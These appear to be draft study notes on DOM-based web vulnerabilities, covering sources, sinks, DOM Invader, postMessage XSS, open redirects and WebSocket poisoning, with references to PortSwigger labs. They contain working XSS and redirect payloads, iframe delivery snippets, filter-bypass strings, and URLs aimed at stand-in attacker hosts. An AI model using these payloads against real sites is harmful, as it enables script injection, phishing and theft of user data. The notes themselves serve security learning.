---
created: 2026-06-19
tags:
  - web_hacking
  - client-side
status: draft
---
## DOM-based vulnerabilities

>[!info] The **Document Object Model (DOM)** is the browser's in-memory, hierarchical, object-oriented representation of a rendered HTML or XML document. It organizes document elements, attributes, and text into a tree of nodes and exposes this structure to JavaScript as a programmable object graph.

- JavaScript can freely read, create, remove, and modify DOM nodes, their attributes, and associated browser-managed objects. These capabilities are often used to implement interactive functionality and are not inherently insecure.
- Vulnerabilities arise when a script takes a user-controlled value and incorporates it into the DOM or passes to a browser API without proper validation, sanitization, or encoding.

>**DOM-based vulnerabilities** occur when client-side JavaScript reads user-controlled data from an untrusted **source** (e.g., `window.location`, `location.hash`) and propagates it to a sensitive **sink** (e.g., `innerHTML`, `eval()`, `location.href`) in an unsafe manner, without proper validation or sanitization.

- The vulnerability is therefore introduced **entirely within the browser** during script execution, rather than in an unsafe response from the server.

> [!important] DOM-based vs. Server-side vulnerabilities 
> - **Reflected** and **stored** vulnerabilities are introduced **server-side**, where untrusted data is incorporated into the HTML/JS response before being sent to the client.
> - **DOM-based vulnerabilities** originate **entirely within the browser**. The server may return a perfectly benign response, while client-side JavaScript subsequently reads user-controlled input and performs an unsafe operation locally. Consequently, these vulnerabilities are often invisible in server-side logs and are best identified through dynamic client-side analysis (rather than static code inspection).
## Taint flow: sources and sinks

![[🛠️ Taint-flow vulnerabilities#Taint-flow model]]
### Common DOM-based sources

| Source                                                                                           | Description                                                                                                                                                                                              |
| ------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `location`<br>`location.href`<br>`document.URL`<br>`document.documentURI`<br>`document.baseURI`  | Complete URL of the current page.                                                                                                                                                                        |
| `location.search`                                                                                | URL query string (e.g., `?a=1&b=2`).                                                                                                                                                                     |
| `location.hash`                                                                                  | Fragment (e.g., `#section1`).                                                                                                                                                                            |
| `location.pathname`                                                                              | URL path.                                                                                                                                                                                                |
| `document.referrer`                                                                              | Referrer URL.                                                                                                                                                                                            |
| `document.cookie`                                                                                | Cookies (non-`HttpOnly`, semicolon-separated).                                                                                                                                                           |
| `window.name`                                                                                    | Name of a window's browsing context; persists across navigations within a tab.                                                                                                                           |
| `localStorage`<br>`sessionStorage`                                                               | Client-side key-value storage.                                                                                                                                                                           |
| `IndexedDB` (and vendor-specific variants like `mozIndexedDB`, `webkitIndexedDB`, `msIndexedDB`) | Client-side database.                                                                                                                                                                                    |
| `window.postMessage()` data receives via a `message` event                                       | Cross-origin/cross-window messages.                                                                                                                                                                      |
| `window.location.origin` (read-only)                                                             | Origin of the current document's URL, in the canonical form (e.g., `https://example.com`).                                                                                                               |
| `document.domain` (deprecated)                                                                   | Domain portion of the origin of the current document (see [`mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain)).                                                           |
| `URLSearchParams`                                                                                | JavaScript interface that defines utility methods to work with the URL query string (see [`mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams)).                            |
| `JSON.parse()`                                                                                   | Parses a JSON string and transforms it into a JavaScript object or value.                                                                                                                                |
| `addEventListener()`                                                                             | Attaches an event handler to a DOM element (relevant when receiving user-controlled events).                                                                                                             |
| `ng-app`                                                                                         | AngularJS directive used to automatically bootstrap an AngularJS application (see [this PortSwigger lab](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)). |
| `FileReader.readAsText()`                                                                        | Asynchronously reads the contents of a specified `Blob` or `File` object and returns it as a text string.                                                                                                |
| `history.pusHState()`                                                                            | Changes URL without reloading; not itself a source, rather, something that may create one.                                                                                                               |
| `history.replaceState()`                                                                         | Similar to `pushState()` but replaces the current history entry.                                                                                                                                         |

>[!note] See [`Window — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/API/Window) and [`Document — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/API/Document).

### DOM-based sinks

- Different sinks introduce different classes of vulnerabilities. For example:
	- `innerHTML`, `outerHTML`, `document.write()` -> HTML injection, potentially JavaScript execution (DOM-based [[XSS]]).
	- `eval()`, `Function()` -> JavaScript execution (DOM-based XSS).
	- `location.href` -> DOM-based open redirection.
	- `document.cookie` -> Cookie manipulation.
	- `document.domain` -> Document-domain manipulation.
	- `WebSocket()` -> WebSocket-URL poisoning.
	- `element.src`, `element.href`, `element.action` -> DOM-based link manipulation.
	- `postMessage()` -> Web message manipulation.
	- `setRequestHeader()` -> AJAX request-header manipulation.
	- `FileReader.readAsText()` -> Local file-path manipulation.
	- `ExecuteSql()` -> Client-side SQL injection.
	- `sessionStorage.setItem()` -> HTML5 storage manipulation.
	- `document.evaluate()` -> Client-side XPath injection.
	- `JSON.parse()` -> Client-side JSON injection.
	- `element.setAttribute()` -> DOM-data manipulation.
	- `RegExp()` -> DoS (Denial of Service).

| Sink                                                                                                                        | Description                                                                                                                                                                                                                         |
| --------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `eval()`                                                                                                                    | Evaluates (executes) JavaScript code represented as a string, returns its completion value (e.g., `eval("alert(1)")`; see [`mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)). |
| `document.write()`<br>`document.writeln()`                                                                                  | Write HTML/text directly into the document stream at page load or after.                                                                                                                                                            |
| `element.innerHTML`                                                                                                         | Reads/writes HTML markup contained within an element. Example payload: `<img src=x onerror=alert(1)`.                                                                                                                               |
| `element.outerHTML`                                                                                                         | Similar to `innerHTML`, but reads/writes the entire element structure, including the element's own tags and its descendants, not just the content inside an element.                                                                |
| `element.src`                                                                                                               | Reads/writes element source. Example payload: `javascript:alert(1)`; executes on element load.                                                                                                                                      |
| `element.href`                                                                                                              | Reads/writes element link. Example payload: `javascript:alert(1)`; executes on click.                                                                                                                                               |
| `setTimeout(code, delay)`                                                                                                   | Executes a function once after a specified delay (e.g., `setTimeout(alert, 3000, 'XSS')` waits for 3 seconds and executes `alert('XSS')` once).                                                                                     |
| `setInterval(code, interval)`                                                                                               | Executes a function repeatedly at fixed time intervals (e.g., `setInterval(alert, 3000, 'XSS'` executes `alert('XSS')` every 3 seconds).                                                                                            |
| `Function()`                                                                                                                | Dynamically creates a new function from a string at runtime; similar to `eval()` (e.g., `new Function("alert(1)")()`).                                                                                                              |
| `element.insertAdjacentHTML(position, text)`                                                                                | Parses a specified HTML string and inserts the resulting nodes into the document tree at a position relative to a target element (`"beforebegin"`, `"afterbegin"`, `"beforeend"`, `"afterend"`).                                    |
| `element.setAttribute(attributName, value)`                                                                                 | Sets attribute on a DOM elements, e.g., `href`, `src`, `class`, etc.<br>E.g., `element.setAttribute("href", "javascript:alert(1)")`                                                                                                 |
| `WebSocket()`                                                                                                               | Establishes a WebSocket connection with the server (used in WebSocket URL poisoning).                                                                                                                                               |
| `XMLHttpRequest()`                                                                                                          | Makes HTTP requests from the browser.                                                                                                                                                                                               |
| `setRequestHeader()`                                                                                                        | Sets custom HTTP headers on XMLHttpRequest or fetch requests.                                                                                                                                                                       |
| `FileReader.readAsText()`                                                                                                   | Reads the contents of files selected by user from disk as text.                                                                                                                                                                     |
| `ExecuteSql()`                                                                                                              | Deprecated Web SQL API function for client-side SQL databases.                                                                                                                                                                      |
| `sessionStorage.setItem()`, `localStorage.setItem()`                                                                        | Saves key-value pairs into client-side storage                                                                                                                                                                                      |
| `document.evaluate()`                                                                                                       | Executes XPath expressions on the DOM.                                                                                                                                                                                              |
| `document.cookie`                                                                                                           | Cookies (semicolon-separated).                                                                                                                                                                                                      |
| `element.onevent`                                                                                                           | Event handlers, execute JavaScript when an event occurs.                                                                                                                                                                            |
| jQuery sinks like `html()`, `attr()`, `append()`                                                                            | Can inject HTML or JavaScript                                                                                                                                                                                                       |
| `window.location`<br>`location.href`<br>`window.location.assign()`<br>`window.location.replace()`<br>`window.location.hash` | Properties/methods used to read/write URL/location; can cause open redirects.                                                                                                                                                       |
| `RegExp()`                                                                                                                  | Creates regex objects from strings, can be used in ReDoS (RegEx Denial of Service) to crash/slow down victim's browser.                                                                                                             |

## DOM Invader

>**DOM Invader** is a Burp Suite extension built into Burp's embedded Chromium browser. It is designed to simplify the detection of client-side vulnerabilities like DOM-based XSS, prototype pollution, and DOM clobbering.

- To enable DOM Invader, open the Burp's embedded browser -> click the DOM Invader extension icon (next to the search bar) -> toggle `DOM Invader on`. Then click `Reload` to reload the tab for the changes to take effect.

![[enable_DOM_Invader.png]]

- Open browser DevTools (`F12` or `Ctrl+Shift+I`) and navigate to the `DOM Invader` tab.

![[DOM_Invader_tab.png]]

- To inject canaries into request parameters and detect client-side vulnerabilities, use `Inject URL params` or `Inject forms`. 
- Enable `Postmessage interception` (DOM Invader settings) to intercept, edit, and replay `postMessage()` calls.
- Enable `Inject canary into all sources` (`Misc` settings) if you want DOM Invader to automatically inject canaries into anything it recognizes as a source and watch every sink for canary reflection.
---
- If an exploitable sink is detected, DOM Invader will flag it in `DevTools` -> `DOM Invader` -> `DOM` tab and suggest a PoC.

![[DOM_Invader_XSS.png]]

- To see any intercepted post messages, navigate to `DevTools` -> `DOM Invader` -> `Messages`.

>[!tip]+ You can use [`portswigger-labs.net/dom-invader`](https://portswigger-labs.net/dom-invader/) test cases to practice with DOM Invader.

## DOM-based XSS

> **DOM-based XSS** is a type of XSS vulnerability that occurs when client-side JavaScript processes attacker-controlled data in an unsafe manner and writes it into the DOM without proper sanitization or encoding.

>[!note] See [[XSS#DOM-based XSS]].


In essence, unsafe DOM processing leads to the execution of attacker-controlled scripts.

### Testing for DOM-based XSS
#### Step 1: Identify potential sources

- Enumerate all places where user input can enter client-side environment, e.g.,
	- URL components
		- URL query parameters (`location.search`)
		- URL fragments (`location.hash`)
		- URL path (`location.pathname`)
		- Full URL (`location.href`)
	- Browser storage
		- Cookies (`document.cookie`)
		- Local storage (`localStorage`)
		- Session storage (`sessionStorage`)
	- Document properties
		- Referer (`document.referer`)
		- Window name (`window.name`)
		- History state (`history.state`, `history.pushState()` data)
	- Inter-window communication
		- `window.postMessage()` data received from other windows or iframes
	- Input elements or form fields pre-filled with user-controlled data
	- Script or inline data copied into the DOM dynamically

>[!tip]
>Use code/test search (`Ctrl + Shift + F`) with above keywords.

- Review all client-side JavaScript for usage of any of the above properties.
- Use browser developer tools’ **Debugger** and **DOM Explorer** to inspect dynamic changes.
- Look for libraries or frameworks that read URL or storage values.
#### Step 2: Identify potential sinks in the application's JavaScript

- Search the page’s JavaScript source code for usage of dangerous sinks:
	- DOM insertion APIs
		- `element.innerHTML`, `element.outerHTML`
		- `element.insertAdjacentHTML()`
		- `document.write()`, `document.writeln()`
	- JavaScript execution APIs
		- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
	- URL/navigation
		- `window.location` (redirects), `window.location`, `location.href`, `window.location.assign()`, `window.location.replace()`, `window.location.hash`
	- Attribute setting
		- `element.setAttribute('src'/'href'/'style')`, direct DOM property assignment
	- Element attributes
		- `element.src`, `element.href` with `javascript:` URLs
	- CSS injection
		- `element.style.cssText` or modifying style attributes
	- WebSocket and XHR
		- WebSocket and XHR	dynamic URLs in `WebSocket()`, `XMLHttpRequest()`
	- Web messaging
	- `element.insertAdjacentHTML()`
		- Processing data from `postMessage()` without origin/sanitization

- Search application's JavaScript for above methods and properties.
- Use static code analysis tools or manually grep for these sink keywords.
- In complex codebases, use symbolic execution or taint tracking tools if available.
#### Step 3: Static taint flow analysis

Having found potential sources and sinks, inspect JavaScript source code:
- Understand program control flow, data flow, and JavaScript semantics.
- Examine how variables and functions transfer potentially unsafe input from sources to sinks.

Trace tainted variables:
- Starting at sources, locate the variables that store tainted data.
- Identify all statements of assigning or passing this data to other variables or functions.
- Track variable flow through assignments, function arguments, returns, closures, and callbacks.

Follow control and data flow:
- Be aware of **control flow branches** that can alter taint propagation (conditions, loops).
- Consider function calls: analyze functions called with tainted arguments.
- Track interprocedural flow — does a function return tainted data or call dangerous sinks?

Check for sanitization or encoding:
- Look for any sanitizing functions or operations on tainted data before it reaches the sink.
- Common sensitization might include escaping characters, filtering tags, or encoding output.
If **no proper sanitization** is applied, the tainted data likely reaches the sink in a dangerous form.

> [!example]+
> ```JS
> var userInput = location.hash.substr(1); // source
> var filtered = filter(userInput);
> display(filtered);  // sink function wrapping innerHTML
> ```
> - You trace`userInput` to `filtered`, analyze how input is transformed, and then trace it `display()` to figure out how this data is used.

>[!tip]
>- Use code searching/`grep` to locate all sources and sinks quickly.
>- In case of complex code, draw diagrams or use code annotations to visually track taint across functions and variables.
>- Be cautious with **context insensitivity**: sometimes functions are used in different contexts; taint flow might differ accordingly. 
>- Note **flow insensitivity** trade-offs: static analysis assumes any order of statements, so it may over-approximate taints. Confirm no sanitization occurs along _any_ path.
#### Step 4: Dynamic taint flow analysis: testing with canaries

- Inject unique, traceable taint strings, sometimes called **canaries**, into sources. For example, `domxss1234`
- Use browser Developer Tools (`F12`):
	- Inspect the DOM and watch if the canary string appears in element' `innerHTML`, attributes, or scripts.
	- Debug JS: set breakpoints in code near sinks to see live variable contents.
	- Look for insertion of your canary string without escaping or encoding.
- Trigger application features that process the input:
    - Click buttons.
    - Navigate pages.
    - Send or receive messages via `window.postMessage()`.
    - Modify session/local storage and observe app logic.
- Tailor injections to context if canaries appear in certain places:
    - If appears inside HTML: inject `<img src=x onerror=alert(1)>`.
    - Inside JavaScript strings: try breaking quotes, e.g., `'domxss1234';alert(1);//`.
    - Inside URLs: use `javascript:` URLs or event handlers.
- Test if malicious input is neutralized or executed.
- If sanitization occurs, try bypassing it with encoding tricks (hex, Unicode, UTF-8).

>[!tip] Document all tainted paths, note sanitization points, and determine if bypass is possible.

>[!tip] Consider statefulness: some taint flows occur only after certain user interaction or app state changes.
#### Step 5: Use automated tools

- DOM Invader (Burp Suite Pro extension)
- XSStrike 

- **ESLint Plugins**: Identify unsafe JavaScript patterns (with custom security rules).
    
- CodeQL: Open-source semantic code querying tool for static taint analysis.
    
- **JSPrime, JSLint, and other security scanners**: Analyze code for risky flows.

>[!important] No single tool replaces the need for **manual review and creative thinking**, especially for DOM-based, JS-heavy, or multi-step attack chains.

## Web message vulnerabilities 
### Mechanics of the Web Messaging API

>**Web Messaging** is a JavaScript API that allows scripts running in different browser contexts — different windows, tabs, or same/cross-origin `<iframe>`s — to exchange data without violating the [[SOP]] (Same-Origin Policy), primarily using the [`window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) method. 

>[!important] The messages is send **locally withing the browser environment** without generating any network traffic (no HTTP requests).

- Sending a message:

```js
targetWindow.postMessage(message, targetOrigin, transfer);
```

- `message`: The data being sent (payload); can be a string, object, array, etc.
- `target_origin`: The origin the message should be delivered to (e.g., `https://example.com`).
- `transfer` (optional): Array of transferable objects for zero-copy transfer (e.g., `ArrayBuffer`, `MessagePort`).

>[!note] See [`Window: PostMessage() method — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) and [`WHATWG HTML5`](https://html.spec.whatwg.org/multipage/).

- Receiving a message (listening to `message` events):

```js
window.addEventListener('message', (event) => {

	// checking the message origin
    if (event.origin !== 'https://trusted.example.com') {
        return; // reject unknown origin
    }
    
    // process event.data
    console.log(event.origin); // sender's origin
    console.log(event.data);   // the payload itself
    console.log(event.source); // reference to the sending window (for replies)
});
```

>[!note] See [`MessageEvent — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent).

>[!interesting]+ The Web Messaging API was designed for cross-origin communication without violating the [[SOP]] restrictions. 
>- Common use cases:
> 	- Communication between an embedded iframe and parent page
> 	- Communication between a popup and parent window (used in social logins, OAuth)
> 	- Communication between different tags or windows of the same origin (e.g., sharing session state)
> 	- [Web workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers)
> 	- Embedding third-party widgets

### DOM-based vulnerabilities via web messages

- If a `message` event listener doesn't check `event.origin` or checks it incorrectly, and passes `event.data` to a sink without validation, this leads to a DOM-based vulnerability.

- To deliver exploit:

```html
<iframe src="https://example.com/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
```

>[!example]
> - Suppose an application listens for `message` events:
> 
> ```html
> <script>
> 	window.addEventListener('message', function(e) {
> 		document.getElementById('ads').innerHTML = e.data;
> 	})
> </script>
> ```
> 
> - The code listens for incoming `message` events and replaces `innerHTML` of an element with the ID `ads` with the message data.
> - The script doesn't verify the origin of the messages, neither the data they carry, and incorporates it directly into the page using the `innerHTML` sink.
> - So, any web message sent to the origin is reflected in the DOM:
> 
> ![[images/walkthrough/PortSwigger/DOM-based vulnerabilities/lab1/3.png]]
> 
> - To get JavaScript execution, you can send a message like this:
> 
> ```html
> <img src=x onerror=print()>
> ```
> 
> 
> - To make the victim's to cause this message so they see `print()` (and now you), you can host an `<iframe>` element on your exploit page that automatically dispatches the relevant message once the frame loads:
> 
> ```html
> <iframe src="https://0af900ba03ccbf2a81d843f400d80091.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
> ```
> - The `onload` handler fires once the `<iframe>` has finished loading the target site, at which point `this.contentWindow` is a live reference to the target's `window` object. It is then used to send messages into the target page from outside the origin. 
> - Because the target's listener never validates `event.origin` or `event.data`, `<img src=x onerror=print()>` goes straight into `innerHTML`. 

>[!bug]+ Labs
>- [[🛠️ DOM-based vulnerabilities labs#1. DOM XSS using web messages]]
>- [[🛠️ DOM-based vulnerabilities labs#2. DOM XSS using web messages and a JavaScript URL]]
>- [[🛠️ DOM-based vulnerabilities labs#3. DOM XSS using web messages and JSON.parse]]
### Bypassing broken origin validation

- Even where a check exists, it may be implemented incorrectly:

```js
window.addEventListener('message', function(e) {
  if (e.origin.indexOf('trusted.example.com') > -1) {
    eval(e.data);
  }
});
```

- `indexOf` only confirms the substring appears _somewhere_ in the origin string — it says nothing about position.
- So, if you control a domain like `trusted.example.com.attacker.com`, it would pass the check, because the substring is present even though the actual origin is entirely attacker-owned.

- `startsWith()` and `endsWith()` fail in a similar way:

```js
if (e.origin.endsWith('trusted.example.com')) { 
	eval(e.data); 
}
```

### Examples
#### Direct `innerHTML` sink

The listener writes `event.data` straight into an element's `innerHTML`:

```js
window.addEventListener('message', function(e) {
  document.getElementById('ads').innerHTML = e.data;
});
```

- Because the value lands in an HTML-parsing sink rather than a JavaScript-execution sink, a `<script>` tag won't fire (the `innerHTML` parser explicitly refuses to execute injected `<script>` elements, and dynamically-inserted `<svg onload=...>` is likewise suppressed in modern browsers). 
- The reliable primitive here is an element whose _load failure_ triggers a handler — `<img src=x onerror=print()>` is the standard choice, since a nonexistent image guarantees the `onerror` handler fires. 
- The full delivery payload:

```html
<iframe src="https://example.com/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
```
#### `javascript:` URL through a redirect sink

- The listener redirects the page if the message data looks like a URL:

```js
window.addEventListener('message', function(e) {
  var url = e.data;
  if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
    location.href = url;
  }
}, false);
```

- This is a navigation sink, not an HTML sink, which opens the door to the `javascript:` pseudo-protocol — anything after `javascript:` is executed as script when the browser "navigates" to it. 
- The code only checks that the string `http:` or `https:` appears _anywhere_, not that the URL starts with it. 
- So you satisfy the filter with a trailing JavaScript comment:

```
javascript:print()//http:
```

- `//` opens a single-line JS comment, and `http:` becomes inert trailing text from the script engine's point of view, while still being present in the string for `indexOf` to find. 
- Delivery:

```html
<iframe src="https://example.com/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
#### `JSON.parse()`

- The listener parses the incoming message as JSON and dispatches based on a `type` field:

```js
window.addEventListener('message', function(e) {
  var iframe = document.createElement('iframe'), player = {element: iframe}, d;
  document.body.appendChild(iframe);
  try {
    d = JSON.parse(e.data);
  } catch(e) { return; }
  switch(d.type) {
    case "page-load":
      player.element.scrollIntoView();
      break;
    case "load-channel":
      player.element.src = d.url;
      break;
    case "player-height-changed":
      player.element.style.width = d.width + "px";
      player.element.style.height = d.height + "px";
      break;
  }
}, false);
```

- `load-channel` is the interesting branch: it assigns attacker-controlled `d.url` directly to an `<iframe>`'s `src` attribute, another navigation-class sink that accepts `javascript:` URLs. 
- Craft the JSON payload:

```json
{"type":"load-channel","url":"javascript:print()"}
```

- Deliver it (with the quoting escaped):

```html
<iframe src="https://example.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

## DOM-based open redirection

- DOM-based open redirection occurs when a client-side script writes user-controlled data into a sink capable of triggering cross-origin navigation — without validating that the destination is one the application actually intends to permit. 
- This can be exploited in phishing.
- If the vulnerable sink accepts arbitrary schemes rather than just `http(s)://`, this escalates from redirection into JavaScript injection via the `javascript:` pseudo-protocol, functionally equivalent to DOM XSS.
- Sinks:

```js
location
location.href
location.host / location.hostname / location.pathname / location.search / location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open() / XMLHttpRequest.send()
jQuery.ajax() / $.ajax()
```

>[!bug]+ Labs
>- [[🛠️ DOM-based vulnerabilities labs#4. DOM-based open redirection]].
### Examples

### `Back to Blog` link

- The vulnerable handler parses the redirect target directly out of the _current page's own URL_ using a regex, rather than from a proper query-string parser:

```js
returnUrl = /url=(https?:\/\/.+)/.exec(location);
location.href = returnUrl ? returnUrl[1] : "/";
```

- The detail that matters most here — and the one that's easy to miss under exam time pressure — is that `.exec(location)` runs the regex against the _entire stringified URL_, not against `location.search`. 
- This means the substring `url=https://...` doesn't need to be a syntactically valid query parameter at all; it just needs to appear literally anywhere in the URL string, including inside the value of a completely different, legitimate parameter. Given a page at `/post?postId=1`, the exploit URL is simply:

```
https://TARGET-LAB-ID.web-security-academy.net/post?postId=1&url=https://exploit-YOUR-EXPLOIT-ID.exploit-server.net/
```

- Because the destination itself contains reserved URL characters (`:`, `/`), those get percent-encoded when placed inside the query string to keep the outer URL well-formed:

```
https://example/post?postId=1&url=https://exploit%2DYOUR-EXPLOIT-ID%2Eexploit%2Dserver%2Enet/
```

- Visiting this URL and then clicking `Back to Blog` fires the vulnerable `onclick` handler, which now redirects to the attacker's exploit server instead of the blog listing.
## DOM-based cookie manipulation

## DOM clobbering 
# drafts

## DOM-based client-side JSON injection

- DOM-based JSON-injection vulnerabilities occur when a script incorporates an attacker-controlled data into a string that is parsed as a JSON data structure and then processed by the application. 

- DOM-based JSON-injection sinks:

```js
JSON.parse()
jQuery.parseJSON()
$.parseJSON()
```

>[!note] See [`Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element).



### Web messaging manipulation

Problems arise when the receiving window doesn't properly validate the message origin and content. In this case, the attacker can manipulate web messages to exploit DOM vulnerabilities on the recipient page. The impact depends on how the destination page handles incoming messages.

>[!example]+ DOM-based XSS through web messaging
> 
> Suppose an application defines the following JavaScript:
> 
> ```HTML
> <script>
> window.addEventListener('message', function(event) {
>     // no origin verification
>     eval(event.data);
> });
> </script>
> ```
> 
> An attacker can host a page with the following iframe:
> 
> ```HTML
> <iframe src="https://vulnerable.example.com" onload="this.contentWindow.postMessage('alert(1)','*')"></iframe>
> ```
> 
> This code creates an `ifrware` that sends a post message to the vulnerable website. The website listens for messages from all origins and evaluates the message content not verifying where the message comes from. So, the attacker exploits it to execute `alert(1)` inside the `eval()` sink on the listener page.




## DOM-based vulnerabilities: beyond XSS

DOM-based vulnerabilities, taint flows without sufficient validation, can lead not only to client-side code execution (XSS). We also need to talk about:

- Open redirects
- Cookie manipulation
- `document.domain` manipulation
- WebSocket URL poisoning
- Link manipulation
- Web message manipulation
- Ajax request-header manipulation 

### Open redirects: `window.location`

>**Open redirect** is a vulnerability that occurs when an application incorporates user-controlled input into the destination of a redirect URL without sufficient validation.
>This allows an attacker to redirect users to arbitrary pages, possibly under arbitrary external domains.

DOM-based vulnerabilities can sometimes lead to open redirects. This happens when client-side JavaScript reads user-controlled parameter from the DOM and uses it unsafely as a destination for a navigation or redirect action in the browser.

>[!note]
>The redirection is performed entirely by the client, via manipulating `window.location` or similar methods. This doesn't involve any interaction from the server or `3xx` HTTP responses.


There's a load of sinks you can use for open redirects:

| Sink                                                    | Description                                                        |
| ------------------------------------------------------- | ------------------------------------------------------------------ |
| `window.location`, `location.href`                      | Sets the full URL for navigation                                   |
| `window.location.assign()`                              | Navigates to specified URL                                         |
| `window.location.replace()`                             | Navigates and replaces current page in history                     |
| `window.location.hash`                                  | Changes URL fragment, can modify client routing logic              |
| `window.open()`                                         | Opens a new browser window or tab with specified URL               |
| `element.srcdoc`                                        | Inline frame content with HTML (can lead to navigation)            |
| AJAX (`XMLHttpRequest.open()`),<br>jQuery AJAX requests | May trigger navigation or data loading, can be hijacked indirectly |

>[!example]+ Example: `location.hash` source and `location.href` sink
> 
> A very common vulnerable pattern is reading a URL from query parameters, hash, or other URL components, and directly assigning it to one of the navigation sinks:
> 
> ```JS
> // vulnerable redirection using location.hash
> let redirectUrl = /https?:\/\/.+/.exec(location.hash);
> if (redirectUrl) {
>   location.href = redirectUrl[0]; // unsafe redirection
> } else {
>   location.href = "/"; // default safe page
> }
> ```
> 
> To exploit this, an attacker can craft the following URL:
> 
> ```
> https://example.com/#https://attacker.com/
> ```
> 
> When the victim visits this URL, the code grabs the hash (URL fragment after `#`) and redirects the browser to `https://attacker.com`. No interaction from the server is needed.

>[!important]+ Escalation to DOM XSS and validation bypass
> 
> Sometimes, you can escalate the vulnerability to DOM XSS by injecting a `javascript:` scheme:
> 
> ```
> https://example.com/page?redirect=javascript:alert(document.cookie)
> ```
> 
> Often, developers try to filter out `javascript:` using naive RegEx or substring match (e.g., `if(url.includes("javascript")) ...`). Try to bypass this:
> 
> ```shell
> JaVaScrIpt:alert('XSS') # case variation 
> Java%0Ascript:alert(1)  # URL-encoded special characters (e.g., line feed)
> java\u000ascript:alert(1) # Unicode-encoed special characters
> ```


```
location
location.host
location.hostname
hocation.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttoRequest.send()
jQuery.ajax()
$.ajax()
```
### Cookie manipulation

In some cases, it's possible to exploit DOM-based vulnerabilities to manipulate cookies. This happens when the sink affects `document.cookie` object.

On its own, this vulnerability may seem minor; it could lead to session fixation or, for example, changes in user preferences, if such data is transferred in cookies. But it can become much more powerful as part of an exploit chain for high-severity attacks.

>[!example]+
> Here's a typical vulnerable pattern of a DOM-based vulnerability that leads to cookie  manipulation:
> 
> ```JS
> document.cookie = 'mode=' + location.hash.substring(1);
> ```
> 
> The script takes user-controlled input, URL fragment (`location.hash`) and stores it in a cookie without validation.

 Further exploitation depends on what the application does with cookies. Say, if cookie values are incorporated into the DOM somehow, this can lead to DOM-based XSS if now validated properly.
### `document.domain` ma nipulation

The [`document.domain`](https://developer.mozilla.org/en-US/docs/Web/API/Document/domain) property controls the domain portion of the origin of the current document. 
If two scripts on different-origin pages under the same parent domain (superdomain) explicitly set the `document.domain` to the **same parent domain**, they can **bypass Same-Origin Policy ([[SOP]]) checks**. 

>[!example]
>For example, pages on subdomains `a.example.com` and `b.example.com` can communicate if both set `document.domain = "example.com"`.

See [`Same-origin policy: Changing origin — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#changing_origin)

If an attacker can control the `document.domain` value of the page through the DOM, they can **bypass the SOP restrictions** by setting the `document.domain` of the vulnerable page and their controlled script to the same value. This means the attacker can **read and modify cookies, `localStorage`, and `sessionStorage` of the vulnerable page**.

If the attacker controls a related subdomain with weaker security, they can escape the SOP.

>[!important] Browsers restrict `document.domain` assignment to the current domain of the page or its child/parent domain. You can't set the value to an arbitrary, unrelated domains.

### WebSocket URL poisoning

If the attacker can control the URL passed into the `WebSocket()` constructor through the DOM, they can induce the victim browser open a WebSocket connection with an **arbitrary server chosen by the attacker**. 

For example, if the application transmits sensitive information through such WebSocket connection, the attacker will be able to exfiltrate this data; if WebSocket messages somehow influence the application behavior, the attacker will be able to subvert the application logic and introduce further attackers.

> [!example]+
> Suppose an application builds the WebSocket URL like this (for whatever reason):
> 
> ```JS
> let wsUrl = window.location.hash.substring(1);
> let ws = new WebSocket(wsUrl);
> ```
> 
> Here, the URL fragment (`location.hash`) controlled by the attacker directly becomes the WebSocket URL.
> 
> For example, the attacker can craft the following link:
> 
> ```
> https://example.com/page#ws://attacker.com/socket
> ```
> 
> A victim visiting this URL will end up their browser establishing a WebSocket connection with the attacker's server.

### Link manipulation

If the application uses JavaScript to dynamically set navigation-based attributes, such as links or form actions, based on user-controlled data, the attacker can manipulate it.

Relevant attributes are:

```JS
element.href   // links <a>, <link>
element.src    // resources, e.g., images, scripts
element.action // forms, i.e., <form> submission URLs
```

- If this JavaScript uses untrusted used-controlled data (e.g., URL query parameters) without proper validation or sanitization, attackers can control these attributes.
- The victim then sees and interacts with links or forms that appear legitimate but actually navigate or submit data to attacker-controlled resources.

Potential consequences:

- Redirection to arbitrary domain, which can facilitate phishing
- Capturing sensitive data (capture sensitive data in forms by manipulating `action` URLs)
- Performing unintended actions (e.g., by changing the file or query string)
- XSS through on-site links (anti-XSS defenses do not typically account for on-site links)

For example:

```HTML
<a id="backLink" href="#">Back</a>

<script>
  // sets the href of backLink dynamically from the returnUrl URL parameter
  document.getElementById('backLink').href = (new URLSearchParams(window.location.search)).get('returnUrl');
</script>
```

The attacker can then craft a URL:

```
https://example.com/page?returnUrl=https://attacker.com/login
```

Or, if no proper XSS protection is enforced: 

```
https://example.com/page?returnUrl=javascript:alert(document.domain)
```


## DOM clobbering

## Sources and sinks cheatsheet




>[!tip]
